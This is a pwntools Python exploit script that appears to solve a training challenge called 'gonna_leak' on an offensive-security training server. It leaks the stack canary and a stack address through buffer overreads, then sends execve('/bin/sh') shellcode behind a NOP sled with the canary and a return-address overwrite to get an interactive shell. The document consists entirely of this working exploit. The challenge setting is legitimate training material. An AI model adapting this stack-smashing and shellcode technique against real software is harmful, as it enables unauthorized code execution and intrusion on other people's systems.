from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./gonna_leak")
		gdb.attach(p, """
		b *main+203
		call (long)mprotect(0x000000404000, 0x1000, 0x7)
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./gonna_leak"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2011)
else:
	p = process("./gonna_leak")

cyclic = cyclic_gen()

asm_code = """
lea rax, [rip]
add rax, 0x16
mov rdi, rax
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

sh = asm(asm_code)

p.send(cyclic.get(105))
p.recvuntil(b'aaazaabb')

canary = b"\x00" + p.recv(7)
print('canary: %#x' % u64(canary))
print('len(canary) = ', len(canary))

input("send second input")
p.send(b'A' * 150 + b'BB')
p.recvuntil(b'BB')
addr = p.recv(6) + b'\x00' * 2
stack = u64(addr) - 325
print('leak stack: %#x' % u64(addr))
print('buffer@: %#x' % stack)
print('len(addr) = ', len(addr))


input("send third input")
p.send(b'\x90'*(104-len(sh)) + sh + canary + b'A'*8 + p64(stack))
input("send fourth input")
p.sendline()

p.interactive()